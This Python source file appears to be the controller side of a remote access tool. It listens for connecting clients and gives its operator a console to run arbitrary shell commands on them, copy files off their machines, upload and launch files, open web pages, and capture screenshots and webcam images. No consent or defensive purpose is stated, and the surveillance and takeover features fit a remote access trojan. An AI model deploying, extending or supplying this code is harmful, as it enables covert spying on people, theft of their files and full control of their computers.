from argparse import ArgumentParser
import socket
from os import system
from os.path import exists, isfile, isdir
from time import sleep
from threading import Thread
try:
    from requests import get as r_get
except ImportError:
    pass


class Server:

    def __init__(self, ip=None, port=6000):
        # server ip, port, main server socket
        self.ip = ip
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # arguments variables
        self.list = False
        self.wait_mode = False
        self.argument_parser()

        # dictionary of clients {id: name, socket}
        # actual chosen client's id, name and socket
        self.clients = {}
        self.client_id = None
        self.client_name = ""
        self.client_socket = None

        # ---------- shell commands variables ----------
        # path mode command
        self.client_path = ""

        # screenshot command
        self.directory_of_screenshots = "screenshots"
        self.screenshot_number = 0

        # webcam command
        self.webcam_shots_directory = "webcam_shots"
        self.webcam_shot_number = 0

        # variable for main loop to accept and create new connections while this is True
        self.accepting_connections = True

        self.closing = False

        # File data to save ip and port
        self.file_data = "data.txt"

        self.ip, self.port = self.check_parameters()

    def argument_parser(self):
        parser = ArgumentParser(usage="python server.py [-options]")
        parser.add_argument("-ip", type=str, nargs="?", const=self.ip, default=self.ip, help="Set ip address.")
        parser.add_argument("-port", type=int, nargs="?", const=self.port, default=self.port, help="Set port. Default is set to 6000.")
        parser.add_argument("-get-local-ip", action="store_true", help="Find and set local ip.")
        parser.add_argument("-get-external-ip", action="store_true", help="Find and set external ip.")
        parser.add_argument("-l", "--list", action="store_true", help="Print all commands.")
        parser.add_argument("-w", "--wait", action="store_true", help="Start with wait command. Wait for connections.")
        args = parser.parse_args()

        if args.get_local_ip:
            device_name = socket.gethostname()
            print("Reading local ip from: {}".format(device_name))
            self.ip = socket.gethostbyname(device_name)

        elif args.get_external_ip:
            self.ip = r_get('https://api.ipify.org').text

        else:
            self.ip = args.ip
            self.port = args.port

        self.list = args.list
        self.wait_mode = args.wait

    # ----------------------------------------------
    # Main program methods
    # ----------------------------------------------

    # Basic startup
    def run(self):
        print("ip -> {}".format(self.ip))
        print("port -> {}".format(str(self.port)))
        print("----------------------------------")

        try:
            # Basic configuration for main server socket
            self.server_socket.bind((self.ip, int(self.port)))
            self.server_socket.listen(10)

            Thread(target=self.accept_connections).start()
            sleep(.1)

            self.shell()

        except OSError as e:
            print(e)
            print("Couldn't bind and start listening on specified parameters.")

    # Main loop for accepting connections
    def accept_connections(self):
        print("Accepting connections...")
        print("----------------------------------")

        self.startup_commands()

        while self.accepting_connections:
            sock, a = self.server_socket.accept()
            if self.wait_mode:
                print("\nNew connection established.")

            if not self.closing:
                client_name = sock.recv(1024).decode("utf-8")
                client_name = "_".join(client_name.split())
                if client_name not in self.get_clients_names():
                    self.clients[str(len(self.clients))] = client_name, sock
                else:
                    x = 1
                    new_client_name = client_name
                    while new_client_name in self.get_clients_names():
                        new_client_name = client_name + str(x)
                        x += 1
                    self.clients[str(len(self.clients))] = new_client_name, sock

        sleep(.1)
        print("Accepting connections stopped.")

        self.server_socket.close()

    # Main loop console
    def shell(self):

        command = ""

        while command != "close" and command != "exit" and command != "quit":
            try:
                print("")

                command = input("-> " if self.client_name == "" else self.client_name + ">" if self.client_path == "" else self.client_path + ">")

                # ----------------------------------------------
                # Server commands
                # ----------------------------------------------

                if command == "print commands" or command == "list":
                    system("clear")
                    self.print_commands()

                elif command == "clear" or command == "cls":
                    system("clear")

                elif command == "show ip":
                    print("ip -> {}".format(self.ip))

                elif command == "show port":
                    print("port -> {}".format(str(self.port)))

                elif command == "show screenshots directory":
                    print(self.directory_of_screenshots)

                elif command == "show webcam shots directory":
                    print(self.webcam_shots_directory)

                elif command == "save":
                    self.save_data()

                elif command.startswith("set "):
                    try:
                        self.set_client(command.split()[1])
                    except IndexError:
                        print("Invalid syntax (set [clients name])")

                elif command == "unset":
                    self.unset_client()

                elif command == "wait":
                    self.waiting_mode()

                elif command == "clients":
                    if self.clients != {}:
                        print("--------------- Connected clients ---------------")
                        print("id        name                ip address")
                        for id, data in self.clients.items():
                            name, sock = data[0], data[1]
                            print(id + " " * (10 - len(id)) + name + " " * (20 - len(name)) + sock.getpeername()[0])
                    else:
                        print("No clients connected.")

                elif command.startswith("rename "):
                    try:
                        old_name = command.split()[1]
                        new_name = command.split()[2]
                        result = self.update_client_name(old_name, new_name)
                        if result:
                            print("New name to client has been set.")
                            if self.is_set(name=old_name):
                                self.unset_client()
                        else:
                            print("Client with that name doesn't exist.")
                    except IndexError:
                        print("Invalid syntax (rename oldname newname)")

                elif command == "name mode":
                    self.client_path = ""

                elif command.startswith("screenshot -s "):
                    self.screenshot_number = int(command.strip("screenshot -s "))
                    print("Screenshots are going to be saved from {}".format(str(self.screenshot_number)))

                # ----------------------------------------------
                # Server-Client commands
                # ----------------------------------------------

                elif command == "check":
                    try:
                        if self.send_command(command):
                            message = self.client_socket.recv(22).decode("UTF-8")
                            print(message)

                    except socket.error as e:
                        print(e)

                elif command == "get name":
                    if self.send_command(command):
                        name = self.client_socket.recv(30).decode("UTF-8")
                        print(name)

                elif command == "path mode":
                    if self.send_command(command):
                        self.client_path = self.client_socket.recv(1024).decode("UTF-8")

                elif command == "startup path":
                    if self.send_command(command):
                        self.client_path = self.client_socket.recv(1024).decode("UTF-8")

                elif command.startswith("cd "):
                    if self.send_command(command):
                        self.client_path = self.client_socket.recv(1024).decode("UTF-8")

                elif command.startswith("dir"):
                    if self.send_command(command):
                        self.get_output()

                elif command.startswith("web "):
                    self.send_command(command)

                elif command.startswith("screenshot"):
                    if " -d " in command:
                        directory = command.replace("screenshot -d ", "")
                        if exists(directory) and isdir(directory):
                            self.directory_of_screenshots = directory
                            print("Directory {} for screenshots has been set.".format(self.directory_of_screenshots))
                        else:
                            print("Directory doesn't exist or specified path is not a directory.")

                    else:
                        if self.send_command(command):
                            self.get_screenshot()

                elif command == "webcam":
                    if self.send_command(command):
                        result = self.client_socket.recv(1024).decode("utf-8")
                        print(result)

                elif command.startswith("read "):
                    if self.send_command(command):
                        respond = self.client_socket.recv(1024).decode("utf-8")
                        if respond != "error":
                            file_name = command.split()[1]
                            file_data = b""
                            while True:
                                data = self.client_socket.recv(1024)
                                file_data += data
                                if data.endswith(b"end"):
                                    break
                            file_data = file_data[:len(file_data) - 3]
                            with open(file_name, "wb") as f:
                                f.write(file_data)
                            print("File {} has been written.".format(file_name))
                        else:
                            print("File doesn't exist or it is directory.")

                elif command.startswith("send "):
                    try:
                        file = command.split()[1]
                        if exists(file) and isfile(file):
                            with open(file, "rb") as f:
                                data = f.read()
                            if self.send_command(command):
                                self.client_socket.send(data)
                                self.client_socket.send("end".encode("utf-8"))
                                output = self.client_socket.recv(22).decode("utf-8")
                                print(output)
                        else:
                            print("File doesn't exist.")

                    except IndexError:
                        print("Invalid syntax (send [file])")

                elif command.startswith("start "):
                    if self.send_command(command):
                        message = self.client_socket.recv(1024).decode("utf-8")
                        print(message)

                elif command == "reset":
                    if self.send_command(command):
                        self.remove_client()

                # Just to be user friendly
                elif command == "":
                    pass

                elif command == "close" or command == "exit" or command == "quit":
                    pass

                else:
                    if command.endswith(" -c"):
                        command = command[:len(command) - 3]
                        if self.send_command(command):
                            self.get_output()
                    else:
                        print("Command doesn't exist.")

            except KeyboardInterrupt:
                print("KeyboardInterrupt")

        self.reset_clients()
        self.exit()

    # ----------------------------------------------
    # Main methods for basic commands
    # Handling clients
    # ----------------------------------------------

    def set_client_valid(self, id, name=None, sock=None):
        if name is None and sock is None:
            self.client_socket = self.clients[id][1]
            self.client_id = id
            self.client_name = self.clients[id][0]
        else:
            self.client_socket = sock
            self.client_id = id
            self.client_name = name

        self.client_path = ""

    # set client
    def set_client(self, id):
        if self.clients != {}:
            if id in self.clients:
                self.set_client_valid(id)
            else:
                name = id
                for client_id, data in self.clients.items():
                    if name == data[0]:
                        self.set_client_valid(client_id)
                        name = None
                        break

                if name is not None:
                    print("Client with this id or name doesn't exist.")
        else:
            print("No clients connected.")

    # is client set
    def is_set(self, id=None, name=None):
        if id is not None:
            if self.client_id == str(id):
                return True
            else:
                return False
        elif name is not None:
            if self.client_name == name:
                return True
            else:
                return False
        else:
            return False

    # unset client
    def unset_client(self):
        self.client_socket = None
        self.client_id = None
        self.client_name = ""
        self.client_path = ""

    # send command to client
    def send_command(self, command):
        if self.client_socket is not None:
            try:
                self.client_socket.send(command.encode("UTF-8"))
                return True
            except OSError:
                print("Client is not connected anymore.")
                self.remove_client()
                return False
        else:
            print("Some client has to be selected.")
            return False

    def remove_client(self):
        self.clients.pop(self.client_id)
        self.client_socket = None
        self.client_id = None
        self.client_name = ""

        self.reset_id_numbers()

    def reset_id_numbers(self):
        length = len(self.clients)
        new_id = 0
        for id in self.clients:
            if new_id != length:
                self.clients[str(new_id)] = self.clients.pop(id)
                new_id += 1

    def get_clients_names(self):
        names = []
        for id, data in self.clients.items():
            names.append(data[0])
        return names

    def get_client_id_by_name(self, name):
        id = None
        if name in self.get_clients_names():
            for i, data in self.clients.items():
                if name in data:
                    id = i
                    break
        return id

    def get_client_name_by_id(self, id):
        pass

    def update_client_name(self, old_name, new_name):
        id = self.get_client_id_by_name(old_name)
        if id is not None:
            self.clients[id] = new_name, self.clients.pop(id)[1]
            return True
        else:
            return False

    # Reset connections with clients
    def reset_clients(self):
        for id in self.clients:
            try:
                self.clients[id][1].send("close".encode("UTF-8"))
            except OSError:
                pass

    # Shutdown whole program, Close the main loop for accepting connections
    def exit(self):
        self.accepting_connections = False
        self.closing = True
        # connect to the main server socket to move loop from start and close the loop
        try:
            closing_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            closing_socket.connect((self.ip, int(self.port)))

        except OSError as e:
            print(e)

        finally:
            print("\nProgram has been closed.")

    # ----------------------------------------------
    # Methods for commands
    # ----------------------------------------------

    @staticmethod
    def print_commands():
        print("""Commands:
server commands:
\tprint commands / list -> print commands
\tclear -> clear the screen
\tshow ip -> show ip address
\tshow port -> show port
\tshow screenshots directory -> show directory where screenshots are going to be saved
\tshow webcam shots directory -> show directory where webcam shots are going to be saved
\tsave -> save ip and port data
\tset [client's id or name] -> set socket by client's name
\tunset -> unset current selected user
\twait -> print new connections
\tclients -> show all connected clients
\trename [oldname newname] -> rename client
\tname mode -> show name instead of path

server-client commands:
\tcheck -> simple check if connection is all right with client
\tget name -> request name from client
\tpath mode -> set and show client's path instead of name
\tcd [options/directory] -> change directory
\tdir [options] -> list directory
\tweb [url] -> open web page by url
\tscreenshot [-d(directory), -s (start number)] -> Get screenshot from client
\t\t    -d -> directory where screenshots are going to be saved
\t\t    -s -> set start number for saving screenshots
\twebcam -> Get image from client's webcam
\tread [file] -> read and save file from client
\tsend [file] -> send file
\tstart [file] -> start and open file
\treset -> reset connection with client

[command] -c -> send any other command

closing commands:
\tclose/exit/quit -> close the program
    """)

    def startup_commands(self):
        if self.list:
            self.print_commands()

        if self.wait_mode:
            print("")
            Thread(target=self.waiting_mode).start()

    def waiting_mode(self):
        try:
            self.wait_mode = True
            input("Press enter to stop...")

        except KeyboardInterrupt:
            pass

        finally:
            self.wait_mode = False

    def get_output(self):
        output = ""
        while True:
            data = self.client_socket.recv(1024).decode("utf-8", errors="ignore")
            output += data
            if data.endswith("end"):
                break
        print(output[:len(output) - 3])

    def get_screenshot(self):

        linux_system = False

        screenshot_data = b""
        
        print("Collecting screenshot data")
        while True:
            data = self.client_socket.recv(1024)
            screenshot_data += data
            print(len(screenshot_data), end="\r")
            if data.endswith(b"end"):
                break
            if data == "error".encode("utf-8"):
                linux_system = True
                break

        if not linux_system:

            while exists(self.directory_of_screenshots + "/screenshot" + str(self.screenshot_number) + ".jpg"):
                self.screenshot_number += 1

            if exists(self.directory_of_screenshots):
                screenshot_name = self.directory_of_screenshots + "/screenshot" + str(self.screenshot_number) + ".jpg"
                with open(screenshot_name, "wb") as f:
                    f.write(screenshot_data[:len(screenshot_data) - 3])
                print("screenshot" + str(self.screenshot_number) + ".jpg " + "saved.\n")
            else:
                print("Directory where screenshot should be saved doesn't exist.")

        else:
            print("Can not take screenshot on linux system.")

    # ----------------------------------------------
    # Constructor methods (and save command)
    # ----------------------------------------------

    def check_parameters(self):
        if self.ip is None or len(self.ip) < 7:
            if exists(self.file_data):
                with open(self.file_data, "r") as f:
                    print("Reading saved file...")
                    try:
                        self.ip, self.port = f.read().split("-")
                    except IndexError:
                        self.ask()
            else:
                self.ask()

        return self.ip, self.port

    def ask(self):
        while True:
            self.ip = input("Set ip -> ")
            if self.ip is not None:
                break

    def save_data(self):
        if exists(self.file_data):
            ans = input("data.txt already exists, do you want to rewrite it ? (y/n): ")
            if ans == "y" or ans == "Y":
                self.write_data()
            else:
                print("Data haven't been stored.")
        else:
            self.write_data()

    def write_data(self):
        with open(self.file_data, "w") as f:
            f.write("{}-{}".format(self.ip, str(self.port)))
        print("Data have been written.")

    # ----------------------------------------------
    # Methods before run() method
    # ----------------------------------------------

    def get_ip(self):
        return self.ip

    def set_ip(self, ip):
        self.ip = ip

    def get_port(self):
        return self.port

    def set_port(self, port):
        self.port = int(port)

    # all commands
    # type -> all, server, server-client
    @staticmethod
    def get_commands(type="all"):
        commands = {"server": ("print_commands/list", "clear/cls", "show ip", "show port", "show screenshots directory",
                               "save", "set [client's id/name]", "unset", "wait", "clients", "rename oldname newname" "name mode", "screenshot -d [directory]", "screenshot -s [start number]"),
                    "server-client": ("check", "get name", "path mode", "cd [directory]", "dir", "web [url]", "screenshot", "screenshot -n [number of screenshots]",
                                      "screenshot -t [seconds]", "webcam", "read [file]", "send [file]", "start [file]", "reset", "close/exit/quit",
                                      "-c in command")}
        if type == "all":
            return commands
        elif type == "server":
            return commands["server"]
        elif type == "server-client":
            return commands["server-client"]
        else:
            return "Invalid type."

    # server commands
    def get_commands_s(self):
        return self.get_commands("server")

    # server-client commands
    def get_commands_sc(self):
        return self.get_commands("server-client")

    # ----------------------------------------------
    # Python Class methods
    # ----------------------------------------------

    def __str__(self):
        return "server ip -> {}\nport -> {}".format(self.ip, str(self.port))


if __name__ == "__main__":
    server = Server()
    server.run()


